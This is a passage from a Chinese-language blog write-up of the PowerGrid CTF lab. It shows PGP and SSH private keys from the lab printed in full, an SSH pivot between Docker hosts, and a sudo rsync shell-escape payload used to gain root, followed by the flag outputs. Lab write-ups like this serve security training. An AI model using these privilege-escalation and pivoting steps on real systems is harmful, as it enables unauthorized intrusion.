class="line">IGsuOLeH8s5UHGlesIB5mieLdqJ2OTYl/OSpYrzh1lSpytqrXM5u6eypBmIMol8H</span><br><span class="line">iQeJ2wOZEOOMlcZxfm1drNI9fPSg3Hs1MWz/K1Pq4WJhZkK9SyJfKAS4ZPjB11Gi</span><br><span class="line">US3pn1fbxc/FJrTsvWfy24ag3U8EdgmkvQ4IE3sc6UPN73gEK6nxhZpVCP2Zc5PS</span><br><span class="line">veckbUZ3rHaZuVSjmlr5X5ypCuK5fgq2/M9qtIgHb1nBWsWrNLRd9NLG1jvCPHiw</span><br><span class="line">ME353bVFdtZdSupoE3SGLpPTH5snl96w23DEzngu7eN2Yhwfgtc9GnhbE5d2rA/M</span><br><span class="line">2pKZEFuYSlUM/CE9tWFGPVsoWmJPyGLGh87rc5N9LIfhMNOH2vo2v/Zz5J8wRI9v</span><br><span class="line">FhAdIZW6JFCj2mg0toz//F76wdyc/eH4WjrDn/11vLGe5a3hZQiUSrUIpoGitM9j</span><br><span class="line">SocjcCRQTV4da4oOWigZLOOdgQYlYHvXN80fVTuQnqNYB/roiv9ZFSXB4vL8FLk0</span><br><span class="line">iT/74cxft6m2Cg5//pnjHkqlVL+aWXWKk2hOrxDr3F3j+OyO5fWEf9lBPnf155ZS</span><br><span class="line">gVkxWpBjaCpGHdpqf8s6whParNDyAtOCvQz8+377EI1y31RED+VbL608ln2iKOvt</span><br><span class="line">gL9cC/dZ6aBNbtQGU+nxXdGrDQJra9U3nyRfrb+Q+citfAcuilKCORQbXFnt+3JZ</span><br><span class="line">IJeuOJx0SFlMvpg1I/Mta2PsR/vLlox8YmI9Jn+aBBK11I2ovIUJk/NfKuE1+JL8</span><br><span class="line">rOn7rmC3LN08vBP29JnhwhgCIpNsgx59Jzuck6CkLgwPx04FR3K/1+6GVbx94q+S</span><br><span class="line">zhlvDjr4A8QqeqWq0bE5O46EksHw+0/bsZX4+bScTwePrKn+9UPvXcaLd8yiS7Io</span><br><span class="line">HKgy1jmHmA/lJqHMIX6YUtyGBK5yL+cA8BfZ1OWRZgc+Whq4YE7hzFEHpWLjJj7p</span><br><span class="line">tpYu9nyRpbm99myWwpF1RTfRPoBkYBx7K9WRTPDH2VaUhbyaOnKQLibmJh0QKmmK</span><br><span class="line">0HA4YW4fgohdjUOjMQ0pPHKnkKKCsN0QQxM9zt0TPx+tIwRvuoYvdKn2j03yBpbY</span><br><span class="line">LfRItzDjX7C/7OfKOR92UACQb/mt1dANxbA1aZtOZl98Rrax5+jx43CruG8Ij+nE</span><br><span class="line">BP3LvRH4jGtDFbyAS88n2jPUb7Gw3S2DW//FinSrRdMW4PdsI7/4NLqXcM4VmsEn</span><br><span class="line">qHscy+pJIs3dxhHpL2Npn7qhw5Ph1L8SQ95YmKv0DYkCNgQYAQoAIBYhBHYjTEPo</span><br><span class="line">TvySkEysjHPRmCDikZm9BQJexDCPAhsMAAoJEHPRmCDikZm9PcUQAJ7lP8Ve1fFY</span><br><span class="line">1f90DtFgYxth9nhF0eflsL/EwsHpdCT6RjWPxUv9azqEvWjq2LJYZaHPo3ht/1Dz</span><br><span class="line">PpV46mkPw4+Bq0JyMVNyC6Vw9nlWQNWKe6QzAeqXpiy7p1A2pQCtwQGwMVnSFpmv</span><br><span class="line">vwTYqSOI3/Ew0l2be8oGK7x1NFDQL6DBwZF8PtBk7Usmy2pjPFBuKXat+MZZDy2b</span><br><span class="line">jW2LFpl7Cnd87JWf/KIB3zLhUG2aOLqCKxUM+00y1Q2oIEvK0aVBdeDejYx6NG59</span><br><span class="line">BkfjmR2l72eAuOyChLt9ZHfFqJjZUfv8gO99i6LvwiziUVqYQlQ0Dh2vi4oihz84</span><br><span class="line">lFxYKvDN+BXLzFabMvMu4rRnLVSRaTsmfASvHou4BA/BOl/EGQZEMA3282A7ZE9+</span><br><span class="line">ss5iPM4T2AQ2GVGqiA42DCJ+z3me3YNoTix4erULUNErsEJXRVZb/wJZao0mNiWJ</span><br><span class="line">WdFSQ+rlz0OYn7owoPbUXoI38CaGbSOvdFt7AjsgviZzASFDwwFeF4T4wwFP2dgD</span><br><span class="line">y04QkdD7KwSLaPBrf12/4I6xB+pUURgTvKXdlBbijtALzxog/pVJ6y1mvVoWxnDp</span><br><span class="line">4RdWYedlhcFu8x3q8KlqJeWp6AHE7ztZB5DbymYewDhEtH0KSd3sJI1kkUdn4G36</span><br><span class="line">O/LG7NOgNrGl6THJtM0huhXOtewCOFA/</span><br><span class="line">=KOs+</span><br><span class="line">-----END PGP PRIVATE KEY BLOCK-----</span><br></pre></td></tr></table></figure>
+
+
+<p>在前面的邮件中我们有读到一个PGP message，这里可以使用pgp工具进行解密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/gpg]</span><br><span class="line">└─# gpg --import priv.gpg</span><br><span class="line">gpg: 目录‘/root/.gnupg’已创建</span><br><span class="line">gpg: 钥匙箱‘/root/.gnupg/pubring.kbx’已创建</span><br><span class="line">gpg: /root/.gnupg/trustdb.gpg：建立了信任度数据库</span><br><span class="line">gpg: 密钥 73D19820E29199BD：公钥 “P48 Hacker &lt;p48@powergrid&gt;” 已导入</span><br><span class="line">gpg: 密钥 73D19820E29199BD：私钥已导入</span><br><span class="line">gpg: 处理的总数：1</span><br><span class="line">gpg:               已导入：1</span><br><span class="line">gpg:       读取的私钥：1</span><br><span class="line">gpg:   导入的私钥：1</span><br><span class="line">                                                                                                                                        </span><br><span class="line">┌──(root㉿kali)-[/home/kali/gpg]</span><br><span class="line">└─# vim back.pgp</span><br><span class="line">                                                                                                                                        </span><br><span class="line">┌──(root㉿kali)-[/home/kali/gpg]</span><br><span class="line">└─# gpg -d back.pgp      </span><br><span class="line">gpg: 由 rsa4096 密钥加密，标识为 559041BFED54D3A2，生成于 2020-05-19</span><br><span class="line">      “P48 Hacker &lt;p48@powergrid&gt;”</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAgEAsBNVFExFUwpIaHIhMQDlu8mFwkNZWRFWBS5qE3BUUhk39/3CeAv2</span><br><span class="line">81W7Z/63EM78eE1PjiccpNA5Vi2r+nfYLS6Nj7qy11BQsGlUKgmcxW79DdmC78LaFHUkYh</span><br><span class="line">G3KtnJcLh4GAlPXoOwwXgwT8iu6dbxXGOzONCrWTTQ7/UjgJOcVIx9814uBDbZAYlXyjvN</span><br><span class="line">aMnrO16Jff00wurmqNfq8D0lLWiU9Wq+9j5z+XvqHGaei3s3Wdhfoc3jtPfwUFsKSlVrQM</span><br><span class="line">nj1i/43XOogwaPAThXRf21yfw5AIworT/xFHuAPlpWpT8z0KV8I4Z+DdiB4fHMtgWJ+t7O</span><br><span class="line">pVzaZ0OP3XiGTXu4qjnRbsXMo/D8ZbGoiADbZnCLpjNlPKAA6HuPR+NmdnsKI/UnuQNjqz</span><br><span class="line">NzBqME0Yrg9aEXUteHdk+mKb7Rppdz8EWYBtiYj+QReNV8DYX6CDl4yx51jTH7wN0Jb6lE</span><br><span class="line">9p4ZOqmGat76j2KAtWAzF+6zLkf4Id+LXakzxC3tql+02kaYfVmq40gdwllIGocEJBT3D7</span><br><span class="line">SWX8XL4KeOJW/1sY7HdoVCNuXSKz82/mtUmFB7hDUYpPse/GIAMbXn6lxURNc8LfkZXEVI</span><br><span class="line">enSakNjjyK0VjUYIxc/sUAulXeuOxNjv3isHANxqcsYv0o+i2qgfAFxdsKkPML+bh0NGTL</span><br><span class="line">MAAAdIKypuuSsqbrkAAAAHc3NoLXJzYQAAAgEAsBNVFExFUwpIaHIhMQDlu8mFwkNZWRFW</span><br><span class="line">BS5qE3BUUhk39/3CeAv281W7Z/63EM78eE1PjiccpNA5Vi2r+nfYLS6Nj7qy11BQsGlUKg</span><br><span class="line">mcxW79DdmC78LaFHUkYhG3KtnJcLh4GAlPXoOwwXgwT8iu6dbxXGOzONCrWTTQ7/UjgJOc</span><br><span class="line">VIx9814uBDbZAYlXyjvNaMnrO16Jff00wurmqNfq8D0lLWiU9Wq+9j5z+XvqHGaei3s3Wd</span><br><span class="line">hfoc3jtPfwUFsKSlVrQMnj1i/43XOogwaPAThXRf21yfw5AIworT/xFHuAPlpWpT8z0KV8</span><br><span class="line">I4Z+DdiB4fHMtgWJ+t7OpVzaZ0OP3XiGTXu4qjnRbsXMo/D8ZbGoiADbZnCLpjNlPKAA6H</span><br><span class="line">uPR+NmdnsKI/UnuQNjqzNzBqME0Yrg9aEXUteHdk+mKb7Rppdz8EWYBtiYj+QReNV8DYX6</span><br><span class="line">CDl4yx51jTH7wN0Jb6lE9p4ZOqmGat76j2KAtWAzF+6zLkf4Id+LXakzxC3tql+02kaYfV</span><br><span class="line">mq40gdwllIGocEJBT3D7SWX8XL4KeOJW/1sY7HdoVCNuXSKz82/mtUmFB7hDUYpPse/GIA</span><br><span class="line">MbXn6lxURNc8LfkZXEVIenSakNjjyK0VjUYIxc/sUAulXeuOxNjv3isHANxqcsYv0o+i2q</span><br><span class="line">gfAFxdsKkPML+bh0NGTLMAAAADAQABAAACAFXT9qMAUsKZvpX7HCbQ8ytInoUFY2ZBRxcb</span><br><span class="line">euWi2ddzJ48hCUyPOH+BCOs2hHITE4po1SDL+/By96AEf1KGXMAZczPepBLEubBkh3w+V0</span><br><span class="line">b+RSgdIPBSoQ9b0rJjRFAE/WaO5SuCTkgaFW0ZcyNRBcJC3kBU8SX+waeoUTjG29lvGsM0</span><br><span class="line">AKlC/VdcjQdstXiFEinEU4ALIyZg6Pkim/Et3v3gMGEkG4hN0mwiIVI5jvLtKtd+5opLKM</span><br><span class="line">KspBSwz1m8JxX48WERiJf9pmf8WuYTql3D4vbhJ14gLoEP0TwycQe089xxGM9QMafBIvQG</span><br><span class="line">OSfyo81JmqoXpRy+wyhkTKoNivBxENOATDy3bG0z5bfRQAlz7o5sjLh3wEMNq+gbQsmQBB</span><br><span class="line">mDgD4wA4c0/aTl7/UQXdnkcI+/+fOwfP0UOFZcWjO6ZORJloKjdA2nvVbvox+6ZyRrP3AS</span><br><span class="line">FWt7DYOrBbi3cJhjyJSq38qQpG1Yy0DbhMKJGMQJbjCKf3bw+cDSsu5WiKK7y+3LFns0Jd</span><br><span class="line">NNflVRMkCERdAxWRE7Ga/1r6/TweLRCQkyGGq93sETeP373I4v35BVe6rMHTZ3U2rZ8cr/</span><br><span class="line">71suv4FGP4LmvEqd/S00mgXngHLK8/KtjVKqIZAD8+ft7mTXE9hyNPV/QLdbm/IJ5C5Fdf</span><br><span class="line">BEdelzvB0Jp73ylHdhAAABACBdUjdZpPwEYyUnKRp3Xs5dEqt3IHuUV37BtAREjWT5X3bN</span><br><span class="line">afjtFDJ4A+ThPG6WImjP2IFaXWrZ0fgiSi8i8BWe3Hq6oZaApVPB7S7fxhcUm6z7TRwrUp</span><br><span class="line">HOZrbeZ7wN6CTD5VjvL4B8Q9C8AyoNg/AtJKhxYjmPN+hoaShcKCjuezwKo0E3C/Q9Mf/X</span><br><span class="line">9ARR0Tfklaa2LapipPK2e3td/I84YJd7GyWxCDAmGw5RSu2cFfcwevd56CzMreJBSv7Kp8</span><br><span class="line">2eX+WC+6fAomSD3h/BBL71mS14hWx5N+vTxLzjqg94VfSYEE5qGvTxZRFKf/bv05sGtv/R</span><br><span class="line">sK58Zhl2QfA60QAAAAEBANxmyymkC/t43RF1Pgv7lgzj7jyKMoXWcATvG3Rn026LAINMNR</span><br><span class="line">AIsggMIbDi2k7K0N4jZxUmvgHFS/IVkoAMOoqbopH3R/S/oDY6gBbqkZdxHYrzAFFAI7YU</span><br><span class="line">mUndb4CXRIEwjf5kRMBVIL+Ws/aWlMvuegSmB06eBsaP7lIwPZSRYcC6pr3yg5YV2I3p7k</span><br><span class="line">WWmuMlC9kvOBIl99ue8k9rGuQW6JBXZuJglHHSZk5t2cR3jxmz9KitZ96wMludkGXKHAOr</span><br><span class="line">FkX8DSpYQlPOSEMRBizOf5LU6UEZTD8sDYT9DzqhRM98TaiQc1m/YD2r/Lg6A7QeyEnyJX</span><br><span class="line">DqZ/48FybkHasAAAEBAMyDvNem68DH64iQbK6oGITTdHJxHtp/qKnIKGOfEdrjBsYJWXj3</span><br><span class="line">rL3F6VHrWxNmj6mVNKs2SQpLptIKclmW8+UlBYYtf4LgTzRRWMv3Ke9HYoXSpNkIIKYG2+</span><br><span class="line">TWeH1nMQDeqph1f3vMzNA6SScMpipuV5ofaENArOh6kCTFXVVuGHjoZgbgCg73FXBaTYid</span><br><span class="line">Ne1y8L/lwpsPLWevpsm5DLwUrqcDaDMMd6CFjSjcKrj99DGy7oKwvkz+4wxbsumvSmUTiY</span><br><span class="line">XZVmZsuWDJbJkLzjKs6kJg14zcXm+fDPeuSVLIQ1zd4C39QzD6CGKyXVn2zlFCs46g1Z6j</span><br><span class="line">31r4Qk2RNRkAAAANcDQ4QHBvd2VyZ3JpZAECAwQFBg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line">gpg: 签名建立于 2020年05月20日 03时17分30秒 +08</span><br><span class="line">gpg:               使用 RSA 密钥 76234C43E84EFC92904CAC8C73D19820E29199BD</span><br><span class="line">gpg: 完好的签名，来自于 “P48 Hacker &lt;p48@powergrid&gt;” [未知]</span><br><span class="line">gpg: 警告：此密钥未被受信任签名认证！</span><br><span class="line">gpg:       没有证据表明此签名属于其声称的所有者。</span><br><span class="line">主密钥指纹： 7623 4C43 E84E FC92 904C  AC8C 73D1 9820 E291 99BD</span><br><span class="line">                                                    </span><br></pre></td></tr></table></figure>
+
+<p>这样我们拿到了一个ssh的key</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里用<span class="built_in">cat</span> &gt; p4.key &lt;&lt;<span class="string">EOF的方式写入私钥，可以避免很多格式上的问题</span></span><br></pre></td></tr></table></figure>
+
+<p>内网探活探到这些机器的网段，可以试着写个脚本进行c段的探测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">p48@powergrid:~$ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 08:00:27:2b:62:9b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.56.107/24 brd 192.168.56.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 429sec preferred_lft 429sec</span><br><span class="line">    inet6 fe80::a00:27ff:fe2b:629b/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    <span class="built_in">link</span>/ether 02:42:65:8e:47:60 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:65ff:fe8e:4760/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">5: veth293b959@if4: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default </span><br><span class="line">    <span class="built_in">link</span>/ether be:22:4d:b8:d7:69 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet6 fe80::bc22:4dff:feb8:d769/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
+
+<p>用key登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p48@powergrid:~$ ssh -i p4.key p48@172.17.0.2</span><br><span class="line">Linux ef117d7a978f 4.19.0-9-amd64 <span class="comment">#1 SMP Debian 4.19.118-2 (2020-04-29) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed May 20 00:22:30 2020 from 172.17.0.1</span><br><span class="line">p48@ef117d7a978f:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(p48) gid=1000(p48) <span class="built_in">groups</span>=1000(p48)</span><br><span class="line">p48@ef117d7a978f:~$ <span class="built_in">whoami</span></span><br><span class="line">p48</span><br></pre></td></tr></table></figure>
+
+<p>成功横向</p>
+<p>检查sudo -l<br>成功提权到root</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">p48@ef117d7a978f:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> p48 on ef117d7a978f:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User p48 may run the following commands on ef117d7a978f:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/rsync</span><br><span class="line">&lt;/bin/sh -c <span class="string">&quot;/bin/sh 0&lt;&amp;2 1&gt;&amp;2&quot;</span><span class="string">&#x27; 127.0.0.1:/dev/null                        </span></span><br><span class="line"><span class="string"># whi^Ho^H^H</span></span><br><span class="line"><span class="string">/bin/sh: 1: w: not found</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># </span></span><br><span class="line"><span class="string"># cat fl*</span></span><br><span class="line"><span class="string">047ddcd1f33dfb7d80da3ce04e89df73</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Well done for getting flag 2. It looks like this user is fairly unprivileged.</span></span><br><span class="line"><span class="string"># pwd</span></span><br><span class="line"><span class="string">/home/p48</span></span><br><span class="line"><span class="string"># cd /root</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">flag3.txt</span></span><br><span class="line"><span class="string"># cat flag*</span></span><br><span class="line"><span class="string">009a4ddf6cbdd781c3513da0f77aa6a2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Well done for getting the third flag. Are you any good at pivoting backwards?</span></span><br></pre></td></tr></table></figure>
+
+<p>笔记哥说我们此时是在容器内，我不太明白，需要ssh反连回去</p>
+<p>刚才探活是有.1和.2两台存活的docker机器，我们已经在.2取得了root，接下来ssh到.1试试看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ef117d7a978f:~# ssh root@172.17.0.1</span><br><span class="line">Linux powergrid 4.19.0-9-amd64 <span class="comment">#1 SMP Debian 4.19.118-2 (2020-04-29) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Tue May 26 18:15:49 2020</span><br><span class="line">root@powergrid:~# </span><br></pre></td></tr></table></figure>
+
+<p>直接连回去了???</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@powergrid:~# <span class="built_in">cat</span> f*</span><br><span class="line">f5afaf46ede1dd5de76eac1876c60130</span><br><span class="line"></span><br><span class="line">Congratulations. This is the fourth and final flag. Make sure to delete /var/www/html/startTime.txt to stop the attack (you will need to run chattr -i /var/www/html/startTime.txt first).</span><br><span class="line"></span><br><span class="line"> _._     _,-<span class="string">&#x27;&quot;&quot;`-._</span></span><br><span class="line"><span class="string">(,-.`._,&#x27;</span>(       |\`-/|</span><br><span class="line">    `-.-<span class="string">&#x27; \ )-`( , o o)</span></span><br><span class="line"><span class="string">          `-    \`_`&quot;&#x27;</span>-</span><br><span class="line"></span><br><span class="line">This CTF was created by Thomas Williams - https://security.caerdydd.wales</span><br><span class="line"></span><br><span class="line">Please visit my blog and provide feedback - I will be glad to hear your comments.</span><br></pre></td></tr></table></figure>
+
+<p>按照提示把那个startTime删除即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@powergrid:~# chattr -i /var/www/html/startTime.txt</span><br><span class="line">root@powergrid:~# <span class="built_in">ls</span> -al /var/www/html</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x  4 www-data www-data 4096 Jan 30 07:07 .</span><br><span class="line">drwxr-xr-x  3 root     root     4096 May 20  2020 ..</span><br><span class="line">-rw-r--r--  1 www-data www-data  580 Jan 30 07:07 abc.php</span><br><span class="line">drwxr-xr-x  2 www-data www-data 4096 May 19  2020 images</span><br><span class="line">-rw-r--r--  1 www-data www-data 4308 May 20  2020 index.php</span><br><span class="line">-rw-r--r--  1 root     root       19 Jan 30 06:55 startTime.txt</span><br><span class="line">-rw-r--r--  1 www-data www-data 1382 May 19  2020 style.css</span><br><span class="line">drwxr-xr-x 12 www-data www-data 4096 May 19  2020 zmail</span><br><span class="line">root@powergrid:~# <span class="built_in">rm</span> /var/www/html/startTime.txt</span><br></pre></td></tr></table></figure>
+
+<p>打完了，可以清理下痕迹</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag"># 靶机</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/28/Done-%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAOpen/" rel="prev" title="群友靶机Open">
+      <i class="fa fa-chevron-left"></i> 群友靶机Open
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/02/03/Redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" rel="next" title="Redis基础学习">
+      Redis基础学习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C"><span class="nav-number">1.</span> <span class="nav-text">Nmap扫描结果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">web目录渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zmail%E8%B7%AF%E5%BE%84%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81%E6%9C%AC%E5%88%B6%E4%BD%9C%E4%B8%8E%E7%88%86%E7%A0%B4"><span class="nav-number">3.</span> <span class="nav-text">zmail路径下的密码本制作与爆破</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Kwansh"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Kwansh</p>
+  <div class="site-description" itemprop="description">往事越千年,魏武挥鞭,东临碣石有遗篇。萧瑟秋风今又是,换了人间</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">41</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
